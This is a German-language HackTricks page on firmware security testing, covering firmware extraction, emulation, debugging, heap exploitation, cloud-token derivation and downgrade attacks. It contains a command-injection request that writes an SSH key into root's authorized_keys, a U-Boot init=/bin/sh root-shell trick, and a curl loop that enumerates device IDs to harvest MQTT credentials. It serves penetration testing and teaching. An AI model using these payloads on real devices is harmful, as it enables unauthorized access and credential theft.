# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

## **Einleitung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist eine essenzielle Software, die den ordnungsgemäßen Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und erleichtert. Sie ist in einem permanenten Speicher abgelegt, sodass das Gerät ab dem Einschalten auf wichtige Anweisungen zugreifen kann, was zum Start des Betriebssystems führt. Die Untersuchung und potenzielle Änderung der Firmware ist ein entscheidender Schritt bei der Identifizierung von Sicherheitslücken.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten zu:

- Der CPU-Architektur und dem darauf ausgeführten Betriebssystem
- Details zum Bootloader
- Hardwareaufbau und Datenblättern
- Kennzahlen der Codebasis und Speicherorten des Quellcodes
- Externen Bibliotheken und Lizenztypen
- Update-Historien und behördlichen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsbewertungen und identifizierten Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence (OSINT)**-Tools äußerst wertvoll, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware kann auf verschiedene Arten beschafft werden, die jeweils einen eigenen Komplexitätsgrad aufweisen:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Durch Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- Nutzung von **Google dork**-Abfragen, um gehostete Firmware-Dateien zu finden
- Direkter Zugriff auf **Cloud-Speicher** mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **Updates** durch Man-in-the-Middle-Techniken
- **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Mithören** von Update-Anfragen innerhalb der Gerätekommunikation
- Identifizieren und Verwenden von **hartcodierten Update-Endpunkten**
- **Dumping** aus dem Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alle anderen Möglichkeiten scheitern, unter Verwendung geeigneter Hardware-Tools

### Nur-UART-Logs: Eine Root-Shell über die U-Boot-Umgebung im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), kannst du dennoch eine Init-Shell erzwingen, indem du den **U-Boot-Umgebungsblob** offline **bearbeitest**:<sup>[[6]](#references)</sup>

1. Den SPI-Flash mit einem SOIC-8-Clip und Programmer (3,3 V) dumpen:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Die U-Boot-Umgebungspartition lokalisieren, `bootargs` so bearbeiten, dass `init=/bin/sh` enthalten ist, und die **U-Boot-Umgebungs-CRC32** für den Blob **neu berechnen**.
3. Nur die Umgebungs-Partition zurückflashen und neu starten; auf UART sollte eine Shell erscheinen.

Dies ist bei Embedded-Geräten hilfreich, bei denen die Bootloader-Shell deaktiviert ist, die Umgebungs-Partition jedoch über einen externen Flash-Zugriff beschreibbar ist.

## Firmware analysieren

Nachdem du nun **über die Firmware verfügst**, musst du Informationen über sie extrahieren, um zu wissen, wie du mit ihr umgehen sollst. Dafür stehen verschiedene Tools zur Verfügung:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Das Dateisystem abrufen

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, **das Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**. Dabei handelt es sich üblicherweise um einen der folgenden Typen: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk **nicht das Magic-Byte des Dateisystems in seinen Signaturen**. Verwende in diesen Fällen binwalk, um den **Offset des Dateisystems zu finden und das komprimierte Dateisystem** aus der Binärdatei zu extrahieren und das Dateisystem anschließend anhand der folgenden Schritte je nach Typ **manuell zu extrahieren**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ könnte auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zu untersuchen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dieser Prozess umfasst die Verwendung verschiedener Tools zur Analyse und Extraktion wertvoller Daten aus dem Firmware-Image.

### Tools für die erste Analyse

Eine Reihe von Befehlen wird für die erste Untersuchung der Binärdatei (als `<bin>` bezeichnet) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und die Details zu Partitionen und Dateisystemen zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu bewerten, wird die **Entropie** mit `binwalk -E <bin>` überprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Kompression hinweist.

Für das Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation zu **file-data-carving-recovery-tools** sowie **binvis.io** zur Dateiuntersuchung empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` kann man das Dateisystem normalerweise extrahieren, häufig in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dabei wird zunächst mit `binwalk` der Offset des Dateisystems ermittelt. Anschließend wird das Dateisystem mit dem Befehl `dd` herausgeschnitten:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden abhängig vom Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Dateisystemanalyse

Nach der Extraktion des Dateisystems beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, hardcodierte Zugangsdaten, API-Endpunkte, Funktionen des Update-Servers, nicht kompilierten Code, Startskripte und kompilierte Binaries zur Offline-Analyse geachtet.

**Wichtige Speicherorte** und **Elemente**, die untersucht werden sollten, umfassen:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Sicherheitslücken
- Eingebettete Binaries für weitere Analysen
- Übliche Webserver und Binaries von IoT-Geräten

Mehrere Tools helfen dabei, sensible Informationen und Sicherheitslücken im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen kompilierter Binaries

Sowohl im Dateisystem gefundener Quellcode als auch kompilierte Binaries müssen sorgfältig auf Sicherheitslücken untersucht werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen dabei, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens abrufen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der wie folgt aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware-Analyse kann festgestellt werden, dass `<token>` lokal aus der Geräte-ID und einem hardcodierten Secret abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als Hexadezimalwert in Großbuchstaben dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen, wodurch häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt werden.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Logs mitschneiden:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das Cloud-Konfigurations-URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binaries in Ghidra/radare2 und suche nach dem config path ("/pf/") oder nach der MD5-Nutzung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud-Konfiguration und MQTT-Credentials abgreifen

- Die URL zusammensetzen und mit curl JSON abrufen; mit jq parsen, um Secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauch von MQTT im Klartext und schwachen Topic-ACLs (falls vorhanden)

- Verwende wiederhergestellte Credentials, um Maintenance-Topics zu abonnieren und nach sensiblen Events zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersehbare Geräte-IDs enumerieren (skalierbar und mit Autorisierung)

- Viele Ökosysteme betten OUI-/Produkt-/Typ-Bytes des Anbieters gefolgt von einem sequenziellen Suffix ein.
- Du kannst mögliche IDs iterieren, daraus Tokens ableiten und Konfigurationen programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du eine umfassende Enumeration durchführst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne die Zielhardware zu verändern.


Der Prozess der Firmware-Emulation ermöglicht eine **dynamische Analyse** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen durch Hardware- oder Architekturabhängigkeiten stoßen. Das Übertragen des Root-Dateisystems oder bestimmter Binaries auf ein Gerät mit passender Architektur und Endianness, beispielsweise einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Einzelne Binaries emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und CPU-Architektur des Programms zu bestimmen.

#### Beispiel mit MIPS-Architektur

Um ein Binary mit MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationswerkzeuge zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (Big-Endian) wird `qemu-mips` verwendet, und für Little-Endian-Binaries wäre `qemu-mipsel` die richtige Wahl.

#### ARM-Architektur-Emulation

Für ARM-Binaries ist der Prozess ähnlich, wobei der Emulator `qemu-arm` für die Emulation verwendet wird.

### Full-System-Emulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In dieser Phase wird entweder eine reale oder emulierte Geräteumgebung für die Analyse verwendet. Es ist wichtig, Shell-Zugriff auf das OS und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sein können. Die Analyse sollte das Dateisystem erneut untersuchen, exponierte Webseiten und Netzwerkdienste ausnutzen und Schwachstellen im Bootloader untersuchen. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Techniken der Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder Binary in seiner Betriebsumgebung interagiert. Dabei werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und durch Fuzzing sowie andere Techniken Schwachstellen zu identifizieren.

Für Embedded-Targets ohne vollständigen Debugger **kopiere ein statisch gelinktes `gdbserver`** auf das Gerät und verbinde es remote:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / Zuordnung von Radio-Co-Processor-Nachrichten

Auf IoT-Hubs ist der RF-Stack häufig zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein sinnvoller Workflow besteht darin, den Pfad abzubilden:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **controllerseitiger Parser** auf dem Radio-MCU
3. **serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **protokollspezifischer Handler / State Machine**

Diese Architektur erzeugt zwei Reversing-Ziele statt eines. Wenn der Controller binäre Radio-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Message-Gruppen** und Dispatch-Tabellen
- Welche Messages aus dem **Netzwerk** und welche vom Controller selbst stammen können
- Die exakten **herstellerspezifischen Discriminator-Felder** (zum Beispiel Zigbee `manufacturer_code` und `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Speziell bei Zigbee solltest du den Pairing-Traffic aufzeichnen und prüfen, ob das Ziel weiterhin den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Sniffen des Commissioning-Traffics den **Network Key** offenlegen. Zigbee-3.0-Install-Codes verringern diese Gefährdung. Notiere daher, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und FSM-gesteuerte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Commands sind oft ein besseres Ziel als standardisierte Cluster, da sie **Custom-Parsing-Code** und interne **FSMs** mit weniger ausgereifter Validierung erreichen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Reverse den Command-Dispatcher, bis du den **herstellerspezifischen Handler** findest.
- Ermittle die Tabellen für **FSM-State**, **Event**, **Check**, **Action** und **Next-State**.
- Identifiziere **Übergangszustände**, die automatisch weiterschalten, sowie Retry-/Error-Zweige, die schließlich attacker-kontrollierten State zurücksetzen oder freigeben.
- Bestätige, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren State zu versetzen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei timing-sensitiven Protokollen kann Packet-Replay aus einem Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Vendor-Grade-Stack zu emulieren, damit du die korrekten **Endpoints**, **Attributes** und das Commissioning-Timing bereitstellen kannst.

### Klasse fragmentierter Download-Bugs in Embedded-Daemons

Eine wiederkehrende Firmware-Bugklasse tritt bei **fragmentierten Blob-/Model-/Configuration-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und allokiert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die attacker-kontrollierten **paketlokalen** Felder wie `packet_total_size >= offset + chunk_len`.
3. Der Copy-Vorgang verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne die **ursprüngliche Allokationsgröße** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** deklarierten Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einer größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Checks erfüllt und dennoch den ursprünglich allokierten Buffer überschreibt.

Wenn der verwundbare Pfad hinter Commissioning-Logik liegt, muss der Exploit ausreichend **Device-Emulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Model-Download- oder Blob-Download-State zu bringen.

### Protokollgesteuerte `free()`-Trigger

Bei Embedded-Daemons lässt sich Heap-Metadata-Exploitation oft nicht am einfachsten durch „auf Cleanup warten“, sondern durch das **Erzwingen des protokolleigenen Error-Handlings** auslösen:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Error-States** zu bringen.
- Überschreite das Retry-Limit, damit der Daemon den **Context zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersehbare `free()`, um Allocator-seitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich gegen **musl/uClibc/dlmalloc-ähnliche** Allocators in Embedded Linux, bei denen die Beschädigung von Chunk-Metadaten die Unlink-/Unbin-Logik in eine Write-Primitive umwandeln kann. Ein stabiles Muster besteht darin, ein **Size-Feld** zu beschädigen, um die Allocator-Traversierung auf **Fake Chunks zu lenken, die innerhalb des überschriebenen Buffers vorbereitet wurden**, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in niedrigeren Programmiersprachen. Binäre Runtime-Protections sind in Embedded-Systemen selten. Wenn sie vorhanden sind, können jedoch Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Consolidation:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake Chunk die Checks überstehen (sane Größe, `fd = 0` und umgebende Chunks werden als „in use“ erkannt).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Wenn ASLR aktiviert ist, das Haupt-Binary aber **non-PIE** ist, sind Adressen in `.data/.bss` innerhalb des Binaries stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** zu lenken.
- **Parser-stoppendes NUL:** Beim Parsen von JSON kann ein `\x00` im Payload das Parsen beenden und gleichzeitig nachfolgende attacker-kontrollierte Bytes für einen Stack Pivot/ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einer bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) stellen vorkonfigurierte Umgebungen für Firmware-Security-Testing bereit, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete OSs zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distro, die dich bei Security Assessments und Penetrationstests von Internet-of-Things-(IoT-)Geräten unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Security-Testing, das bereits mit Tools für Firmware-Security-Testing ausgestattet ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades) häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten Public Key überprüft, aber nicht die *Version* (oder einen monotonen Counter) des zu flashenden Images vergleicht, kann ein Angreifer **ältere, verwundbare Firmware mit weiterhin gültiger Signatur** legitim installieren und dadurch bereits behobene Schwachstellen erneut einführen.<sup>[[4]](#references)</sup>

Typischer Angriffs-Workflow:

1. **Ein älteres signiertes Image beschaffen**
* Lade es aus dem öffentlichen Download-Portal, CDN oder von der Support-Website des Herstellers herunter.
* Extrahiere es aus zugehörigen Mobile-/Desktop-Anwendungen (z. B. innerhalb eines Android-APKs unter `assets/firmware/`).
* Beziehe es aus Third-Party-Repositories wie VirusTotal, Internetarchiven, Foren usw.
2. **Das Image über einen offengelegten Update-Kanal auf das Gerät hochladen oder dort bereitstellen:**
* Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
* Viele Consumer-IoT-Geräte stellen *nicht authentifizierte* HTTP(S)-Endpoints bereit, die Base64-kodierte Firmware-Blobs akzeptieren, diese serverseitig decodieren und Recovery/Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die im neueren Release behoben wurde (zum Beispiel einen Command-Injection-Filter, der erst später hinzugefügt wurde).
4. Optional wieder das aktuelle Image flashen oder Updates deaktivieren, um nach dem Erlangen der Persistence eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach einem Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der anfälligen (herabgestuften) Firmware wird der Parameter `md5` ohne Bereinigung direkt in einen Shell-Befehl verkettet, wodurch die Injection beliebiger Befehle möglich ist (hier zur Aktivierung eines SSH-Schlüssel-basierten Root-Zugriffs). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch das Fehlen eines Downgrade-Schutzes macht die Behebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus Mobile Apps extrahieren

Viele Hersteller bündeln vollständige Firmware-Images in ihren begleitenden Mobile Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden üblicherweise unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Updater-only Anti-Rollback-Bypass in A/B-Slot-Designs

Einige Anbieter implementieren zwar einen Anti-Downgrade-**ratchet**, jedoch nur innerhalb der *Updater*-Logik (beispielsweise eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Wenn der **bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, kann der Rollback-Schutz weiterhin umgangen werden.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **security ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-ratchet mit einem im persistenten Speicher abgelegten Wert und weist ältere signierte Images zurück.
- Der **bootloader** parst diesen ratchet **nicht** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Generation Counter pro Slot gespeichert und ist **nicht kryptografisch an den exakten Firmware-Digest gebunden**, der validiert wurde.

Dies erzeugt in Dual-Slot-Systemen ein **validate-one-image / boot-another-image**-Primitiv. Wenn der Angreifer den Updater dazu bringen kann, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren, und Slot B später vor dem Reboot überschreiben kann, bootet der **bootloader** möglicherweise trotzdem das downgraded Image, weil er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Häufiges Abuse-Muster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Switch-Routine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht rebooten**. In derselben Session erneut die Slot-Vorbereitungs-/Erase-Routine aufrufen.
3. Stale Boot-State- oder stale Slot-Selection-Logik ausnutzen, sodass der Updater den **gleichen physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine überspringen, die den ratchet erzwingt, und direkt rebooten.
6. Der **bootloader** wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Beim Reversen von A/B-Update-Implementierungen sollte man auf Folgendes achten:

- Slot-Auswahl, die aus **Boot-Time-Flags** abgeleitet wird, die nach einem erfolgreichen Switch nicht aktualisiert werden.
- Eine Routine im Stil von `prepare_passive_slot()`, die einen Slot anhand von stale State statt anhand des **aktuell festgeschriebenen Layouts** löscht.
- Eine Funktion im Stil von `part_write_layout()`, die nur einen **Generation Counter** / ein Active-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in ROM / bootloader / Secure-Boot-Stages**.
- Erase- oder Recovery-Routinen, die den Slot auch dann als bootfähig markiert lassen, nachdem sein Inhalt entfernt und neu geschrieben wurde.

### Checklist zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpoints* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Counter**?
* Wird das Image innerhalb einer Secure-Boot-Chain verifiziert (z. B. durch Signaturprüfung im ROM-Code)?
* Erzwingt der **bootloader denselben ratchet** wie der Updater, statt nur Signatur/CRC zu prüfen?
